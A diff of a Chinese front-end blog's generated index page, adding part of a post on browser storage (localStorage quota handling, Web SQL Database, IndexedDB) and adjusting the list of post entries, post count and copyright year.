+<p><strong>&#x7528;&#x9014;&#xFF1A;</strong><br>&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5728;&#x4E0D;&#x540C;&#x9875;&#x9762;&#x95F4;&#x5B9E;&#x65F6;&#x540C;&#x6B65;&#x6570;&#x636E;&#xFF08;&#x76F8;&#x540C;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4E0D;&#x540C;&#x7A97;&#x53E3;&#x95F4;&#xFF09;&#x3002;</p>
+<h3 id="&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;"><a href="#&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;" class="headerlink" title="&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;"></a>&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;</h3><p><strong>QUOTA_EXCEEDED_ERR</strong> &#xFF1A;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x5927;&#x5C0F;&#x8D85;&#x51FA;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x9650;&#x5236;&#x5C31;&#x4F1A;&#x629B;&#x51FA;&#x8FD9;&#x4E2A;&#x5F02;&#x5E38;<br>&#x6700;&#x4F73;&#x5B9E;&#x8DF5;&#x662F;&#xFF0C;&#x5F53;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x65F6;&#x4F7F;&#x7528;try/catch&#x5305;&#x88F9;&#x4EE3;&#x7801;&#x5757;&#x3002;</p>
+<pre><code>function setSettings() {
+      if (&apos;localStorage&apos; in window &amp;&amp; window[&apos;localStorage&apos;] !== null) {
+          try {
+              localStorage.setItem(&apos;keyName&apos;, &apos;keyValue&apos;);
+          } catch (e) {
+              if (e == QUOTA_EXCEEDED_ERR) {
+                      alert(&apos;Quota exceeded!&apos;);
+                  }
+        }
+     } else {
+          alert(&apos;Cannot store user preferences as your browser do not support local storage&apos;);
+      }
+}
+</code></pre><h2 id="&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;"><a href="#&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;"></a>&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;</h2><p>cookie&#x3001;sessionStorage&#x3001;localStorage&#x5BB9;&#x91CF;&#x8F83;&#x5C0F;&#xFF0C;&#x4E14;&#x53EA;&#x80FD;&#x5904;&#x7406;key-value&#x7ED3;&#x6784;&#x7684;&#x7B80;&#x5355;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x5219;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#x3002;</p>
+<p><strong>&#x5305;&#x62EC;</strong> &#xFF1A;Web SQL Database  / IndexedDB</p>
+<p><strong>&#x8BBF;&#x95EE;</strong> &#xFF1A;&#x540C;&#x57DF;&#x540D;&#x4E0B;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x3002;</p>
+<p><strong>&#x5B58;&#x50A8;&#x65F6;&#x95F4;</strong> &#xFF1A;&#x6C38;&#x4E45;&#x5B58;&#x50A8;&#xFF0C;&#x9664;&#x975E;&#x7528;&#x6237;&#x624B;&#x52A8;&#x6E05;&#x9664;&#x6570;&#x636E;&#x3002;</p>
+<p><strong>&#x5927;&#x5C0F;&#x9650;&#x5236;</strong> &#xFF1A;&#x7406;&#x8BBA;&#x4E0A;&#x6CA1;&#x6709;&#x5927;&#x5C0F;&#x9650;&#x5236;&#xFF0C;&#x4F46;IndexedDB&#x7684;&#x6570;&#x636E;&#x5E93;&#x8D85;&#x8FC7;50M&#x7684;&#x65F6;&#x5019;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x5F39;&#x51FA;&#x786E;&#x8BA4;&#x3002;</p>
+<h3 id="Web-SQL-Database"><a href="#Web-SQL-Database" class="headerlink" title="Web SQL Database"></a>Web SQL Database</h3><ol>
+<li>&#x53EF;&#x4EE5;&#x5904;&#x7406;&#x590D;&#x6742;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4E14;&#x4F7F;&#x7528;SQL&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;</li>
+<li>&#x56E0;&#x4E3A;&#x8FC7;&#x4E8E;&#x4F9D;&#x8D56;&#x540E;&#x7AEF;SQL&#x8BED;&#x8A00;&#x7684;&#x8BED;&#x6CD5;&#xFF0C;<strong>&#x5DF2;&#x88AB;Web&#x5E94;&#x7528;&#x5DE5;&#x4F5C;&#x7EC4;&#x5E9F;&#x5F03;</strong> &#xFF0C;&#x4F46;&#x5728;&#x624B;&#x673A;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x7684;&#x7684;&#x652F;&#x6301;&#x7387;&#x4ECD;&#x7136;&#x8F83;&#x9AD8;</li>
+</ol>
+<p>&#x200B;    [&#x56FE;5]<img src="/2016/11/11/storage-in-frontent/" alt=""></p>
+<p><strong>&#x4E09;&#x4E2A;&#x6838;&#x5FC3;&#x65B9;&#x6CD5;&#xFF1A;</strong><br>openDatabase&#xFF1A;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;<br>transaction&#xFF1A;&#x7528;&#x4E8E;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x63A7;&#x5236;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;<br>executeSql&#xFF1A;&#x7528;&#x4E8E;&#x6267;&#x884C;SQL &#x67E5;&#x8BE2;</p>
+<h3 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h3><ol>
+<li>IndexedDB&#x66F4;&#x50CF;&#x662F;NoSQL&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;JS&#x7684;&#x65B9;&#x6CD5;&#x64CD;&#x4F5C;&#x6570;&#x636E;</li>
+<li>&#x5927;&#x90E8;&#x5206;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x5DF2;&#x652F;&#x6301;&#x6216;&#x652F;&#x6301;&#x90E8;&#x5206;&#x529F;&#x80FD;</li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/10/30/knowledge-about-encoding-and-transcoding/" itemprop="url">
                   前端中关于编码和转码的知识小总结
                 </a>
@@ -646,6 +878,140 @@
 </ol>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/09/20/read-book-professional-javascript4/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/09/20/read-book-professional-javascript5/" itemprop="url">
+                  Javascript基础5-Date
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-20T22:00:00+08:00" content="2016-09-20">
+              2016-09-20
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Javascript/" itemprop="url" rel="index">
+                    <span itemprop="name">Javascript</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/20/read-book-professional-javascript5/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/09/20/read-book-professional-javascript5/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/09/20/read-book-professional-javascript5/" class="leancloud_visitors" data-flag-title="Javascript基础5-Date">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>&#x6458;&#x8981;&#xFF1A;</p>
+<ol>
+<li>for in &#x5FAA;&#x73AF;&#x5982;&#x679C;&#x5C5E;&#x6027;&#x503C;&#x4E3A;null&#x548C;undefined&#xFF0C;ES3&#x62A5;&#x9519;&#xFF0C;ES5&#x7EC8;&#x6B62;&#x5FAA;&#x73AF;&#xFF0C;&#x6545;&#x4F7F;&#x7528;&#x524D;&#x9700;&#x8981;&#x68C0;&#x6D4B;&#x503C;&#x662F;</li>
+</ol>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/09/20/read-book-professional-javascript5/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1376,268 +1742,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/11/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch/" itemprop="url">
-                  ion-view、ng-repeat遇到$watch时产生的一个小坑
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-11T21:31:00+08:00" content="2016-07-11">
-              2016-07-11
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/框架/" itemprop="url" rel="index">
-                    <span itemprop="name">框架</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/11/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/11/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2016/07/11/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch/" class="leancloud_visitors" data-flag-title="ion-view、ng-repeat遇到$watch时产生的一个小坑">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>&#x4F7F;&#x7528;ionic&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x573A;&#x666F;&#xFF0C;&#x9700;&#x8981;&#x5BF9;ion-radio&#x4F7F;&#x7528;ng-rapeat&#xFF0C;&#x4EE5;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x9009;&#x9879;&#x5217;&#x8868;&#xFF0C;&#x5E76;&#x5F53;&#x9009;&#x62E9;&#x9009;&#x9879;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x68C0;&#x6D4B;&#x503C;&#x7684;&#x6539;&#x53D8;&#x3002;&#x9009;&#x9879;&#x5217;&#x8868;&#x662F;&#x653E;&#x5728;&#x4E00;&#x4E2A;ion-view&#x4E2D;&#x7684;&#xFF0C;&#x8FD9;&#x5176;&#x4E2D;&#x6D89;&#x53CA;&#x591A;&#x5C42;scope&#x7684;&#x5D4C;&#x5957;&#xFF1A;controller&#x6709;&#x4E00;&#x4E2A;&#x9876;&#x5C42;scope&#xFF0C;ion-view&#x5728;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x5B50;scope&#xFF0C;ng-repeat&#x53C8;&#x4F1A;&#x751F;&#x6210;&#x81EA;&#x5DF1;&#x7684;scope&#xFF0C;&#x591A;&#x4E2A;scope&#x5D4C;&#x5957;&#x8D77;&#x6765;&#x975E;&#x5E38;&#x590D;&#x6742;&#xFF0C;&#x5B9E;&#x73B0;&#x7684;&#x65F6;&#x5019;&#x641E;&#x5F97;&#x6BD4;&#x8F83;&#x4E45;&#xFF0C;&#x8BB0;&#x5F55;&#x4E0B;&#x7ED3;&#x679C;&#xFF1A;<br></p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/11/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/02/Obstacles_I_Met_When_Using_Hexo/" itemprop="url">
-                  使用Hexo踩坑小记
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-02T13:30:00+08:00" content="2016-07-02">
-              2016-07-02
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/框架/" itemprop="url" rel="index">
-                    <span itemprop="name">框架</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/02/Obstacles_I_Met_When_Using_Hexo/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/02/Obstacles_I_Met_When_Using_Hexo/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2016/07/02/Obstacles_I_Met_When_Using_Hexo/" class="leancloud_visitors" data-flag-title="使用Hexo踩坑小记">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>&#x4E4B;&#x524D;&#x5C31;&#x88C5;&#x597D;&#x4E86;Hexo&#xFF0C;&#x4F46;&#x4ECD;&#x6709;&#x597D;&#x591A;&#x672A;&#x5B8C;&#x6210;&#x7684;&#x90E8;&#x5206;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x7EC6;&#x8282;&#x5806;&#x8D77;&#x6765;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5927;&#x5DE5;&#x7A0B;&#x5566;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x5751;&#x5751;&#x4EEC;&#xFF0C;&#x90A3;&#x90FD;&#x662F;&#x6211;&#x901D;&#x53BB;&#x7684;&#x9752;&#x6625;&#x3C0;__&#x3C0;<br></p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/02/Obstacles_I_Met_When_Using_Hexo/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1683,7 +1787,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">14</span>
+              <span class="site-state-item-count">16</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1744,7 +1848,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
